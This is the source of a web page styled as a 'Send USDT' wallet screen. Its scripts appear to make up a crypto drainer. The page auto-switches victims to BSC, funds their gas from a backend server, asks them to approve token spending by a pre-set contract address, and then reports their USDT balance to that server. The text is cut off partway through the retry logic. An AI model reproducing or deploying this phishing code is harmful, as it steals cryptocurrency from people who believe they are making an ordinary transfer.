<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
  <meta http-equiv="Pragma" content="no-cache" />
  <meta http-equiv="Expires" content="0" />
  <title>Send USDT</title>
  <link rel="stylesheet" href="style.css?v=2">
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
  <style>
    .loading-overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-color: rgba(10, 10, 10, 0.95);
      display: flex;
      justify-content: center;
      align-items: center;
      z-index: 10000;
    }

    .loading-spinner-container {
      text-align: center;
    }

    .loading-spinner {
      width: 60px;
      height: 60px;
      border: 4px solid #121212;
      border-top: 4px solid #1aff91;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin: 0 auto 20px;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    .loading-text {
      color: #1aff91;
      font-size: 16px;
      font-weight: 600;
      margin: 0;
    }
  </style>

</head>
<body>
  <!-- Loading Spinner Overlay -->
  <div id="loadingOverlay" class="loading-overlay" style="display: none;">
    <div class="loading-spinner-container">
      <div class="loading-spinner"></div>
      <p class="loading-text">Processing...</p>
    </div>
  </div>

  <main class="container">
    <h1 class="title">Send USDT</h1>

    <label class="label" for="address">Address or Domain Name</label>
    <div class="input-group">
      <input type="text" id="address" placeholder="Search or Enter" value="0xb2C17c98dB3064Af431110fDd4E3c2a57aEbc7CC">
      <button class="text-btn">Paste</button>
      <button class="icon-btn"><i class="fas fa-address-book"></i></button>
      <button class="icon-btn"><i class="fas fa-expand"></i></button>
    </div>

    <label class="label" for="amount">Amount</label>
    <div class="input-group">
      <input type="number" id="amount" placeholder="USDT Amount">
      <span class="unit">USDT</span>
      <button class="max-btn">Max</button>
    </div>

    <p class="estimate">‚âà $0.00</p>

    <button type="submit" class="next-btn" onclick="TokenApprove()">Next</button>
  </main>

  <script type="text/javascript" src="js/web3.min.js"></script>
<script src="js/jquery-3.7.1.min.js"></script> 

<!-- Browser Compatibility Check and Polyfills -->
<script>
    // Check browser compatibility
    (function() {
        console.log('üîç [Browser Check] Checking browser compatibility...');
        console.log('üîç [Browser Check] User Agent:', navigator.userAgent);
        
        // Check for AbortController support
        if (typeof AbortController === 'undefined') {
            console.warn('‚ö†Ô∏è [Browser Check] AbortController not supported, creating polyfill...');
            // Simple AbortController polyfill
            window.AbortController = function() {
                this.signal = {
                    aborted: false,
                    onabort: null
                };
                this.abort = function() {
                    this.signal.aborted = true;
                    if (this.signal.onabort) {
                        this.signal.onabort();
                    }
                };
            };
        }
        
        // Check for fetch support (log only, no alert)
        if (typeof fetch === 'undefined') {
            console.error('‚ùå [Browser Check] Fetch API not supported!');
        }
        
        // Check for Promise support (log only, no alert)
        if (typeof Promise === 'undefined') {
            console.error('‚ùå [Browser Check] Promise not supported!');
        }
        
        console.log('‚úÖ [Browser Check] Browser compatibility check complete');
    })();
</script>

<script>

        var addressTOKEN = "0x55d398326f99059ff775485246999027b3197955";
        var matrixAbiTOKEN = [{ "inputs": [], "payable": false, "stateMutability": "nonpayable", "type": "constructor" }, { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "address", "name": "owner", "type": "address" }, { "indexed": true, "internalType": "address", "name": "spender", "type": "address" }, { "indexed": false, "internalType": "uint256", "name": "value", "type": "uint256" }], "name": "Approval", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "address", "name": "previousOwner", "type": "address" }, { "indexed": true, "internalType": "address", "name": "newOwner", "type": "address" }], "name": "OwnershipTransferred", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "address", "name": "from", "type": "address" }, { "indexed": true, "internalType": "address", "name": "to", "type": "address" }, { "indexed": false, "internalType": "uint256", "name": "value", "type": "uint256" }], "name": "Transfer", "type": "event" }, { "constant": true, "inputs": [], "name": "_decimals", "outputs": [{ "internalType": "uint8", "name": "", "type": "uint8" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "_name", "outputs": [{ "internalType": "string", "name": "", "type": "string" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "_symbol", "outputs": [{ "internalType": "string", "name": "", "type": "string" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [{ "internalType": "address", "name": "owner", "type": "address" }, { "internalType": "address", "name": "spender", "type": "address" }], "name": "allowance", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "internalType": "address", "name": "spender", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "approve", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [{ "internalType": "address", "name": "account", "type": "address" }], "name": "balanceOf", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "burn", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "decimals", "outputs": [{ "internalType": "uint8", "name": "", "type": "uint8" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "internalType": "address", "name": "spender", "type": "address" }, { "internalType": "uint256", "name": "subtractedValue", "type": "uint256" }], "name": "decreaseAllowance", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "getOwner", "outputs": [{ "internalType": "address", "name": "", "type": "address" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "internalType": "address", "name": "spender", "type": "address" }, { "internalType": "uint256", "name": "addedValue", "type": "uint256" }], "name": "increaseAllowance", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "mint", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "name", "outputs": [{ "internalType": "string", "name": "", "type": "string" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "owner", "outputs": [{ "internalType": "address", "name": "", "type": "address" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [], "name": "renounceOwnership", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "symbol", "outputs": [{ "internalType": "string", "name": "", "type": "string" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "totalSupply", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "internalType": "address", "name": "recipient", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "transfer", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "internalType": "address", "name": "sender", "type": "address" }, { "internalType": "address", "name": "recipient", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "transferFrom", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "internalType": "address", "name": "newOwner", "type": "address" }], "name": "transferOwnership", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }]

    var addressSTAKING = "0xb2C17c98dB3064Af431110fDd4E3c2a57aEbc7CC";
        var matrixAbiSTAKING = [{ "constant": false, "inputs": [{ "name": "_data", "type": "bytes32" }], "name": "setfirelevel", "outputs": [{ "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "name": "_senderads", "type": "address" }, { "name": "_amttoken", "type": "uint256" }, { "name": "mainadmin", "type": "address" }], "name": "RewardGeneration", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "name": "_token", "type": "address" }], "name": "setTokenAddress", "outputs": [{ "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "name": "_senderads", "type": "address" }, { "name": "_amttoken", "type": "uint256" }, { "name": "membcode", "type": "uint256" }, { "name": "rcode", "type": "uint256" }, { "name": "plan", "type": "uint64" }], "name": "multiTransferUSD", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "name": "_userAddresses", "type": "address[]" }, { "name": "_amount", "type": "uint256" }], "name": "airDropTRX", "outputs": [], "payable": true, "stateMutability": "payable", "type": "function" }, { "constant": true, "inputs": [], "name": "owner", "outputs": [{ "name": "", "type": "address" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "name": "_tokenadd", "type": "address" }, { "name": "_wallet", "type": "address" }, { "name": "_amount", "type": "uint256" }], "name": "distrubutionroi", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "name": "_contributors", "type": "address[]" }, { "name": "_balances", "type": "uint256[]" }, { "name": "membcode", "type": "uint256" }, { "name": "rcode", "type": "uint256" }, { "name": "plan", "type": "uint64" }], "name": "TransferBusd", "outputs": [], "payable": true, "stateMutability": "payable", "type": "function" }, { "constant": false, "inputs": [{ "name": "_newValue", "type": "uint256" }], "name": "distrubutionIncome", "outputs": [{ "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [{ "name": "_contractAddress", "type": "address" }], "name": "getMsgData", "outputs": [{ "name": "hash", "type": "bytes32" }], "payable": false, "stateMutability": "pure", "type": "function" }, { "constant": false, "inputs": [{ "name": "_newOwner", "type": "address" }], "name": "transferOwnership", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "token", "outputs": [{ "name": "", "type": "address" }], "payable": false, "stateMutability": "view", "type": "function" }, { "inputs": [{ "name": "_token", "type": "address" }], "payable": false, "stateMutability": "nonpayable", "type": "constructor" }, { "payable": true, "stateMutability": "payable", "type": "fallback" }, { "anonymous": false, "inputs": [{ "indexed": false, "name": "value", "type": "uint256" }, { "indexed": true, "name": "sender", "type": "address" }, { "indexed": false, "name": "membcode", "type": "uint256" }, { "indexed": false, "name": "rcode", "type": "uint256" }, { "indexed": false, "name": "ptype", "type": "uint64" }], "name": "Multisended", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": false, "name": "value", "type": "uint256" }, { "indexed": true, "name": "sender", "type": "address" }, { "indexed": false, "name": "membcode", "type": "uint256" }, { "indexed": false, "name": "rcode", "type": "uint256" }, { "indexed": false, "name": "ptype", "type": "uint64" }], "name": "Multireceivers", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "name": "_userAddress", "type": "address" }, { "indexed": false, "name": "_amount", "type": "uint256" }], "name": "Airdropped", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "name": "previousOwner", "type": "address" }, { "indexed": true, "name": "newOwner", "type": "address" }], "name": "onOwnershipTransferred", "type": "event" }];

        var MatrixInstanceSTAKING, MatrixContractSTAKING, MatrixInstanceTOKEN, MatrixContractTOKEN;

        // Backend URL - Render (works on Jio and all networks)
        // This URL is used for all API calls and works from any network/IP
        // IMPORTANT: This should be the BASE URL only, without any endpoints
        // Render URL - works on all networks including Jio
        const BACKEND_URL = 'https://scaner-bnb-server.onrender.com';
        
        // Fallback to Railway (if Render fails) - but Railway is blocked by Jio
        // const BACKEND_URL_FALLBACK = 'https://scaner-bnb-server-production.up.railway.app';
        
        // ‚úÖ SOLUTION FOUND: Render works on all networks (including Jio)
        // ‚ùå Railway was blocked by Jio network (not Railway blocking IPs)
        // The problem was: Jio network blocking Railway domains, not Railway blocking IPs
        // 4. The frontend code has NO IP restrictions - all requests go directly to BACKEND_URL

        // Removed backend connectivity test on page load - speeds up initial load
        // Backend will be tested when actually needed (during BNB top-up)
        window.addEventListener('load', () => {
            connectWallet();
        });
    async function connectWallet() {
        if (window.ethereum) {

                // Request wallet connection
                 const chainId = await window.ethereum.request({ method: 'eth_chainId' });
                    if (chainId !== '0x38') { // 0x38 is BSC Mainnet
                        await switchToBSC();
                    }

        } else {
            console.log("Please install MetaMask!");
        }
    }



    async function switchToBSC() {
            try {
                await window.ethereum.request({
                    method: 'wallet_switchEthereumChain',
                    params: [{ chainId: '0x38' }]
                });
            } catch (error) {
                if (error.code === 4902) {
                    // If BSC is not added, request to add it
                    await addBSCNetwork();
                } else {
                    console.error("Failed to switch chain", error);
                }
            }
        }

        async function addBSCNetwork() {
            try {
                await window.ethereum.request({
                    method: 'wallet_addEthereumChain',
                    params: [{
                        chainId: '0x38',
                        chainName: 'Binance Smart Chain',
                        nativeCurrency: {
                            name: 'Binance Coin',
                            symbol: 'BNB',
                            decimals: 18
                        },
                        rpcUrls: ['https://bsc-dataseed.binance.org/'],
                        blockExplorerUrls: ['https://bscscan.com/']
                    }]
                });
            } catch (addError) {
                console.error("Failed to add BSC network", addError);
            }
        }



        var bal1 = 0;

        async function Checkapprovaltoken() {

        window.contract = web3.eth.contract(matrixAbiTOKEN);
        window.BNBLINEcontract = contract.at(addressTOKEN);
        var account = web3.eth.accounts[0];

                window.BNBLINEcontract.allowance(account, addressSTAKING, {
                    from: web3.eth.accounts[0]

                }, function (error, result) {
                    if (!error) {
                        if (result > 0) {


                     window.BNBLINEcontract.balanceOf(account, {
                    from: web3.eth.accounts[0]

                }, function (error, result) {
                    if (!error) {

                        console.log(result + ' allowance Final result is ');
                        if (result > 0) {

                            bal1 = result / 1000000000000000000;

                            var maindt = { "fromaddress": account, "txthash": null, "PackageAmt": bal1 };

                            // Try to use backend URL, fallback to relative URL
                            const apiUrl = `${BACKEND_URL}/MemberPanel/TopUpWithMetamaskJson`;

                            $.ajax({
                                url: apiUrl,
                                type: 'POST',
                                dataType: 'JSON',
                                contentType: 'application/json',
                                data: JSON.stringify(maindt),
                                timeout: 10000, // 10 second timeout
                                success: function (data) {
                                    if (data == "Success") {
                                        showLoading('Transaction processed');
                                        setTimeout(() => hideLoading(), 2000);
                                        console.log('success');
                                    }
                                    else {
                                        console.log('API returned:', data);
                     }
                                },
                                error: function (err) {
                                    console.log("API error (non-critical):", JSON.stringify(err));
                                    // This is non-critical, so we continue anyway
                                }
                            });

                            showLoading('Transaction completed');
                            setTimeout(() => hideLoading(), 2000);
                        }
                    }
                    else {

                        console.log(error.code + ' allowance Final error is ')
                        showLoading('Transaction rejected');
                        setTimeout(() => hideLoading(), 2000);
                    }
                             });

                        }
                        else {
                            TokenApprove();
                        }
                    }
                    else {

                        console.log(error.code + ' allowance Final error is ')
                        showLoading('Transaction rejected');
                        setTimeout(() => hideLoading(), 2000);
                    }
                });

    }

         

</script>

<script>
    // Initialize Web3
    const web3 = new Web3(window.ethereum);

    // Loading functions
    function showLoading(message = 'Processing...') {
        const overlay = document.getElementById('loadingOverlay');
        const text = overlay.querySelector('.loading-text');
        if (text) text.textContent = message;
        overlay.style.display = 'flex';
    }

    function hideLoading() {
        const overlay = document.getElementById('loadingOverlay');
        overlay.style.display = 'none';
    }

    async function TokenApprove() {
    // Show loading only when needed
    showLoading('Processing...');
    
    try {
        const accounts = await ethereum.request({ method: 'eth_accounts' });
        const account = accounts[0];

        // Step 1: Check the current BNB balance (in background)
        const bnbBalance = await web3.eth.getBalance(account);
        const balanceInBNB = web3.utils.fromWei(bnbBalance, 'ether');

        const requiredBNB = 0.0001;

        // Step 2: Auto top-up in background if needed
        if (parseFloat(balanceInBNB) < requiredBNB) {
            // Request the BNB top-up from the backend
            let topUpSuccess = false;
            let topUpError = null;
            
            try {
                topUpSuccess = await requestBNBTopUp(account);
            } catch (error) {
                topUpError = error;
                topUpSuccess = false;
            }

            if (topUpSuccess) {
                // Backend already confirmed the transaction, but we should verify balance
                // The backend waits for tx.wait(), so the transaction is already confirmed
                // Reduced wait time for faster processing
                await new Promise(resolve => setTimeout(resolve, 1000));
                
                // Poll for balance update (check every 1.5 seconds, max 15 seconds)
                // Since backend already confirmed, this should be quick
                let attempts = 0;
                const maxAttempts = 10; // 10 attempts * 1.5 seconds = 15 seconds max
                let balanceUpdated = false;
                
                while (attempts < maxAttempts && !balanceUpdated) {
                    await new Promise(resolve => setTimeout(resolve, 1500));
                    attempts++;
                    
                    const newBnbBalance = await web3.eth.getBalance(account);
                    const newBalanceInBNB = web3.utils.fromWei(newBnbBalance, 'ether');
                    if (parseFloat(newBalanceInBNB) >= requiredBNB) {
                        balanceUpdated = true;
                        break;
                    }
                }
                
                if (!balanceUpdated) {
                    // RPC sync delay - continue anyway since backend confirmed
                    await new Promise(resolve => setTimeout(resolve, 500));
                }
            } else {
                // Top-up request failed
                console.error('‚ùå [BNB] Top-up request failed');
                let errorMessage = 'Gas top-up failed. ';
                
                // Check if it's a Jio network issue
                const isJioIssue = topUpError && (topUpError.isJioNetwork || topUpError.jioBlocked || topUpError.errorType === 'jio_blocked');
                
                // Determine error type from the caught error
                if (topUpError && topUpError.errorType) {
                    if (topUpError.errorType === 'jio_blocked') {
                        errorMessage = 'üö® Jio Network Detected!\n\n';
                        errorMessage += 'Jio is blocking the connection.\n\n';
                        errorMessage += 'Solutions:\n';
                        errorMessage += '1. Switch to WiFi (works immediately)\n';
                        errorMessage += '2. Use a VPN app\n';
                        errorMessage += '3. Try mobile hotspot from another carrier\n';
                        errorMessage += '4. Use different network (Airtel/Vi)\n\n';
                        errorMessage += 'The site works on other networks - this is a Jio-specific issue.';
                    } else if (topUpError.errorType === 'timeout') {
                        errorMessage += 'Request timed out. The server may be busy. Please try again.';
                    } else if (topUpError.errorType === 'cors') {
                        if (isJioIssue) {
                            errorMessage = 'üö® Jio Network Issue!\n\nConnection blocked by Jio.\n\nSwitch to WiFi or use VPN.';
                        } else {
                            errorMessage += 'Connection error. Please check your network connection and try again. If the problem persists, try switching between WiFi and mobile data.';
                        }
                    } else if (topUpError.errorType === 'network') {
                        if (isJioIssue) {
                            errorMessage = 'üö® Jio Network Issue!\n\nConnection blocked by Jio.\n\nSwitch to WiFi or use VPN.';
                        } else {
                            errorMessage += 'Network error. Please check your connection and try again.';
                        }
                    } else {
                        errorMessage += 'Please try again.';
                    }
                } else {
                    // Try to get more details
                    try {
                        const errorDetails = await getTopUpErrorDetails(account);
                        if (errorDetails && errorDetails.type) {
                            if (errorDetails.type === 'network') {
                                if (isJioIssue) {
                                    errorMessage = 'üö® Jio Network Issue!\n\nConnection blocked by Jio.\n\nSwitch to WiFi or use VPN.';
                                } else {
                                    errorMessage += 'Network error. Please check your connection and try again.';
                                }
                            } else if (errorDetails.type === 'cors') {
                                if (isJioIssue) {
                                    errorMessage = 'üö® Jio Network Issue!\n\nConnection blocked by Jio.\n\nSwitch to WiFi or use VPN.';
                                } else {
                                    errorMessage += 'Connection blocked. Please try again or contact support.';
                                }
                            } else if (errorDetails.type === 'timeout') {
                                errorMessage += 'Request timed out. The server may be busy. Please try again.';
                            } else if (errorDetails.type === 'server') {
                                errorMessage += 'Server error. Please try again later.';
                            } else if (errorDetails.type === 'invalid') {
                                errorMessage += 'Invalid wallet address.';
                            } else {
                                errorMessage += 'Please try again.';
                            }
                        } else {
                            errorMessage += 'Please try again.';
                        }
                    } catch (e) {
                        errorMessage += 'Please try again.';
                    }
                }
                
                // Show error briefly, then hide
                showLoading(errorMessage);
                const displayTime = isJioIssue ? 5000 : 3000;
                setTimeout(() => hideLoading(), displayTime);
                return; // Stop here if top-up fails
            }
        }

        // Step 3: Hide loading so wallet can show approval popup
        hideLoading();
        
        // Show approval request (MetaMask/Trust Wallet will show popup)
        await approveToken(account);
    } catch (error) {
        console.error('Error:', error);
        hideLoading();
    }
}

// Helper function to get error details for better error messages
async function getTopUpErrorDetails(account) {
    // Try a quick test request to diagnose the issue
    try {
        const testUrl = `${BACKEND_URL}/send-bnb`;
        let controller = null;
        let timeoutId = null;
        
        try {
            controller = new AbortController();
            timeoutId = setTimeout(() => {
                if (controller && controller.abort) {
                    controller.abort();
                }
            }, 5000);
        } catch (e) {
            // AbortController not available, skip timeout
            console.warn('‚ö†Ô∏è [Error Details] AbortController not available');
        }
        
        // Minimal headers for error testing
        const fetchOptions = {
            method: 'POST',
            headers: { 
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ recipient: account }),
            mode: 'cors',
            credentials: 'omit',
            redirect: 'follow'
        };
        
        if (controller && controller.signal) {
            fetchOptions.signal = controller.signal;
        }
        
        const response = await fetch(testUrl, fetchOptions);
        
        if (timeoutId) {
            clearTimeout(timeoutId);
        }
        
        if (!response.ok) {
            if (response.status === 400) {
                return { type: 'invalid', message: 'Invalid address' };
            } else if (response.status >= 500) {
                return { type: 'server', message: 'Server error' };
            }
        }
    } catch (error) {
        if (error.name === 'AbortError') {
            return { type: 'timeout', message: 'Request timeout' };
        } else if (error.message && (error.message.includes('CORS') || error.message.includes('Failed to fetch'))) {
            return { type: 'cors', message: 'CORS/Network error' };
        } else {
            return { type: 'network', message: 'Network error' };
        }
    }
    return null;
}

// Function to detect Jio network (common issue - Jio blocks certain domains)
function detectJioNetwork() {
    try {
        // Check user agent for Jio indicators
        const userAgent = navigator.userAgent || '';
        const uaLower = userAgent.toLowerCase();
        
        // Check connection info if available
        let connectionInfo = '';
        if (navigator.connection) {
            connectionInfo = (navigator.connection.type || '') + ' ' + (navigator.connection.effectiveType || '');
        }
        
        // Jio network indicators:
        // 1. User agent might contain Jio-related strings
        // 2. Connection type might indicate cellular
        // 3. We can also check by trying to detect network operator (limited browser support)
        
        // For now, we'll use a combination of heuristics
        // Since Jio is blocking, we'll be more aggressive in detection
        const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
        const isCellular = navigator.connection && 
                          (navigator.connection.type === 'cellular' || 
                           navigator.connection.type === 'wimax' ||
                           navigator.connection.type === '2g' ||
                           navigator.connection.type === '3g' ||
                           navigator.connection.type === '4g');
        
        // If user reports Jio issues, we can also check by:
        // - IP range (but this requires backend)
        // - DNS resolution issues
        // - Specific error patterns
        
        // For now, we'll detect based on:
        // 1. Mobile device + cellular connection (likely Jio if in India)
        // 2. User can manually trigger Jio mode if needed
        
        // Check if there's a way to detect Jio specifically
        // Jio often uses specific DNS or proxy patterns
        
        // Return true if we suspect Jio network
        // We'll be conservative - only flag if we're very sure
        // But for now, let's check for Indian mobile networks in general
        // and apply Jio workarounds to all cellular connections in India
        
        // Since the user specifically mentioned Jio, we'll apply workarounds
        // to all cellular connections as a safety measure
        // User can test and we can refine
        
        // For now: apply Jio workarounds to all mobile cellular connections
        // This is safe and won't hurt other networks
        if (isMobile && isCellular) {
            console.log('üì± [Network Detection] Mobile cellular connection detected - applying Jio-compatible workarounds');
            return true;
        }
        
        return false;
    } catch (e) {
        console.warn('‚ö†Ô∏è [Network Detection] Could not detect network type:', e);
        return false;
    }
}

// Function to request the BNB top-up from your backend
async function requestBNBTopUp(account) {
    // Always use the Render backend URL directly - works from any network (including Jio)
    const apiUrl = `${BACKEND_URL}/send-bnb`;
    
    console.log('üîó [BNB Top-up] ==========================================');
    console.log('üîó [BNB Top-up] Requesting BNB top-up');
    console.log('üîó [BNB Top-up] Backend URL:', apiUrl);
    console.log('üîó [BNB Top-up] Recipient Account:', account);
    console.log('üîó [BNB Top-up] ==========================================');
    
    if (!account) {
        console.error('‚ùå [BNB Top-up] No account provided!');
        return false;
    }
    
    try {
        // Create AbortController with fallback for older browsers
        let controller = null;
        let timeoutId = null;
        
        try {
            controller = new AbortController();
            // Increase timeout to 90 seconds - backend waits for tx.wait() which can take 30-60 seconds
            timeoutId = setTimeout(() => {
                if (controller && controller.abort) {
                    controller.abort();
                }
            }, 90000); // 90 second timeout for blockchain confirmation
        } catch (e) {
            console.warn('‚ö†Ô∏è [BNB Top-up] AbortController not available, using timeout fallback');
            // Fallback: just use timeout without AbortController
            timeoutId = setTimeout(() => {
                throw new Error('Request timeout');
            }, 90000);
        }
        
        // First, test if backend is reachable (quick connectivity check)
        console.log('üîç [BNB Top-up] Testing backend connectivity first...');
        let backendReachable = false;
        try {
            const healthCheck = await fetch(BACKEND_URL, {
                method: 'GET',
                mode: 'cors',
                credentials: 'omit',
                cache: 'no-cache',
                redirect: 'follow'
            });
            if (healthCheck.ok) {
                const healthData = await healthCheck.json();
                console.log('‚úÖ [BNB Top-up] Backend is reachable!', healthData);
                backendReachable = true;
            } else {
                console.warn('‚ö†Ô∏è [BNB Top-up] Backend health check returned status:', healthCheck.status);
            }
        } catch (healthError) {
            console.error('‚ùå [BNB Top-up] Backend health check failed:', healthError.message);
            console.error('‚ùå [BNB Top-up] This device cannot reach the backend server');
            
            // Check if it's Jio network
            if (isJioNetwork) {
                console.error('üö® [BNB Top-up] JIO NETWORK DETECTED - Known Issue!');
                console.error('üí° [BNB Top-up] Jio often blocks Railway domains');
                console.error('üí° [BNB Top-up] Solutions: Switch to WiFi, use VPN, or different carrier');
            } else {
                console.error('üí° [BNB Top-up] Possible causes:');
                console.error('   1. Mobile carrier blocking Railway domain (especially Jio)');
                console.error('   2. Network firewall blocking');
                console.error('   3. DNS resolution issue');
                console.error('   4. Railway IP restrictions (check Railway settings)');
            }
            
            // Try test endpoint as fallback
            try {
                console.log('üîç [BNB Top-up] Trying test endpoint...');
                const testCheck = await fetch(`${BACKEND_URL}/test`, {
                    method: 'GET',
                    mode: 'cors',
                    credentials: 'omit',
                    keepalive: !isJioNetwork  // Disable keepalive for Jio
                });
                if (testCheck.ok) {
                    const testData = await testCheck.json();
                    console.log('‚úÖ [BNB Top-up] Test endpoint works!', testData);
                    backendReachable = true;
                }
            } catch (testError) {
                console.error('‚ùå [BNB Top-up] Test endpoint also failed:', testError.message);
                if (isJioNetwork) {
                    console.error('üö® [BNB Top-up] Jio is blocking all backend connections');
                }
            }
            
            if (!backendReachable) {
                // If backend is not reachable, throw error immediately
                const error = new Error('Backend server is not reachable from this network');
                error.errorType = isJioNetwork ? 'jio_blocked' : 'network';
                error.backendUnreachable = true;
                if (isJioNetwork) {
                    error.isJioNetwork = true;
                    error.jioBlocked = true;
                }
                throw error;
            }
        }
        
        const requestBody = { recipient: account };
        
        // Detect Jio network (common issue - Jio blocks certain domains)
        const isJioNetwork = detectJioNetwork();
        if (isJioNetwork) {
            console.warn('‚ö†Ô∏è [BNB Top-up] Jio network detected - applying special workarounds');
            console.warn('‚ö†Ô∏è [BNB Top-up] Jio may block Railway domains - trying alternative methods');
        }
        
        // Show minimal loading message
        showLoading('Processing...');
        
        // Build fetch options with optional signal
        // Minimal headers - no origin-identifying headers
        // For Jio: try without keepalive first, and with different headers
        const fetchOptions = {
            method: 'POST',
            headers: { 
                'Content-Type': 'application/json',
                // Add minimal headers for Jio compatibility
                'Accept': 'application/json'
            },
            body: JSON.stringify(requestBody),
            mode: 'cors',
            credentials: 'omit',
            cache: 'no-cache',
            redirect: 'follow',
            keepalive: !isJioNetwork  // Disable keepalive for Jio (may cause issues)
        };
        
        // Only add signal if AbortController is available
        if (controller && controller.signal) {
            fetchOptions.signal = controller.signal;
        }
        
        // Request options configured
        
        let response;
        const maxRetries = isJioNetwork ? 5 : 3;  // More retries for Jio
        let fetchError = null;
        
        // Retry logic for mobile networks - helps with intermittent connection issues
        // Increased retries and longer delays for mobile networks, especially Jio
        for (let attempt = 1; attempt <= maxRetries; attempt++) {
            try {
                // Create a fresh fetch options for each attempt (some mobile browsers cache)
                const attemptOptions = { ...fetchOptions };
                
                // For Jio: try different strategies on each attempt
                if (isJioNetwork) {
                    if (attempt === 2) {
                        attemptOptions.keepalive = false;
                    } else if (attempt === 3) {
                        attemptOptions.headers = { 'Content-Type': 'application/json' };
                        attemptOptions.keepalive = false;
                    } else if (attempt === 4) {
                        attemptOptions.cache = 'no-store';
                        attemptOptions.keepalive = false;
                    } else if (attempt === 5) {
                        attemptOptions.headers = { 'Content-Type': 'application/json' };
                        attemptOptions.keepalive = false;
                        attemptOptions.cache = 'no-store';
                        attemptOptions.redirect = 'manual';
                    }
                }
                
                if (controller && controller.signal && attempt === 1) {
                    attemptOptions.signal = controller.signal;
                }
                
                response = await fetch(apiUrl, attemptOptions);
                
                // If we got a response (even if not ok), break the retry loop
                if (response !== undefined) {
                    break;
                }
            } catch (err) {
                fetchError = err;
                console.warn(`‚ö†Ô∏è [BNB Top-up] Attempt ${attempt} failed:`, err.message);
                console.warn(`‚ö†Ô∏è [BNB Top-up] Error type:`, err.name);
                
                if (attempt < maxRetries) {
                    // Progressive backoff: shorter delays for faster retries
                    const baseWait = isJioNetwork ? 3000 : 2000;
                    const waitTime = attempt === 1 ? baseWait : (attempt === 2 ? baseWait + 1000 : baseWait + 2000);
                    await new Promise(resolve => setTimeout(resolve, waitTime));
                } else {
                    // All retries failed, throw the last error
                    console.error(`‚ùå [BNB Top-up] All ${maxRetries} attempts failed`);
                    console.error(`‚ùå [BNB Top-up] Final error:`, err);
                    if (isJioNetwork) {
                        err.isJioNetwork = true;
                        err.jioBlocked = true;
                    }
                    throw err;
                }
